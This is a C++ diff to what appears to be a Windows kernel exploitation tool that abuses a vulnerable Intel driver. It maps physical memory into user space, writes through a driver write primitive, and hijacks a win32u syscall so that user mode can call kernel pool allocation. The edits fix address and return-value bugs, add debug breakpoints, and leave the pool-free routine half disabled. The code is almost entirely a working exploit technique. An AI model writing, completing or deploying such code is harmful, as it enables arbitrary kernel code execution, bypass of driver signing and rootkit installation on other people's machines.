@@ -44,7 +44,7 @@ namespace kernel::intel
 		std::cout << "[+] RVA " << std::hex << "0x" << address << " -> Physical Address 0x" << physical_address << std::dec << std::endl;
 
 		//Map our physical memory space into our processes virtual address space
-		const uint64_t mapped_physical_address = intel_map_physical(address, buffer_size);
+		const uint64_t mapped_physical_address = intel_map_physical(physical_address, buffer_size);
 
 		std::cout << "[+] mapped physical address" << std::hex << "0x" << mapped_physical_address << std::dec << std::endl;
 
@@ -53,6 +53,7 @@ namespace kernel::intel
 			std::cerr << "[-] Failed to map physical address 0x" << std::hex << physical_address << std::dec << " into our processes' virtual memory space" << std::endl;
 			return false;
 		}
+
 		DebugBreak();
 		bool success = driver_write_primitive(mapped_physical_address, buffer, buffer_size);
 
@@ -62,7 +63,7 @@ namespace kernel::intel
 			return false;
 		}
 
-		return false;
+		return success;
 	}
 
 	uint64_t intel_vulnerable_driver::allocate_kernel_pool(POOL_TYPE pool_type, uint64_t pool_size)
@@ -82,8 +83,14 @@ namespace kernel::intel
 		uint64_t pool_addr = 0;
 
 		win32u->patch_syscall(this, allocate_pool_kernel_addr);
-		win32u->execute_and_restore_syscall(this, &pool_addr, pool_type, pool_size);
-
+		{
+			using fnExAllocatePool = uint64_t(WINAPI*)(POOL_TYPE, SIZE_T);
+			static const auto usermode_addr = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("win32u.dll"), "NtGdiGetCOPPCompatibleOPMInformation"));
+			fnExAllocatePool ExAllocatePool = reinterpret_cast<fnExAllocatePool>(usermode_addr);
+			DebugBreak();
+			pool_addr = ExAllocatePool(pool_type, pool_size);
+		}
+		win32u->restore_syscall(this);
 		return pool_addr;
 	}
 
@@ -102,7 +109,8 @@ namespace kernel::intel
 		uint64_t pool_addr = 0;
 
 		win32u->patch_syscall(this, free_pool_kernel_addr);
-		win32u->execute_and_restore_syscall<void>(this, nullptr, address);
+		win32u->restore_syscall(this);
+		//win32u->execute_and_restore_syscall<void>(this, nullptr, address);
 
 		return pool_addr;
 	}
